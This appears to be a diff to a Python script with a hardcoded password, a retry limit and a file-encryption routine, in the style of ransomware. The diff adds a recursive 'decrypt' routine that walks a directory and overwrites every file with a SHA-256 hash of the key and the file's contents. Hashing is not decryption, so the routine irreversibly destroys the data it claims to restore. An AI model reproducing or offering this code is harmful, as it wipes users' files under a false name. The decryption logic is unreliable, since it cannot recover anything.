@@ -6,6 +6,19 @@ import hashlib
 password = '%2Jg@m#sg#@&p@nt@!$%'
 max_tries = 3
 
+def decrypt_file(filename, key):
+    with open(filename, 'rb') as f:
+        encrypted_data = f.read()
+    decrypted_data = hashlib.sha256(key.encode() + encrypted_data).hexdigest().encode()
+    with open(filename, 'wb') as f:
+        f.write(decrypted_data)
+
+def decrypt_files(path, key):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            decrypt_file(file_path, key)
+
 def encrypt_file(filename, key):
     with open(filename, 'rb') as f:
         data = f.read()
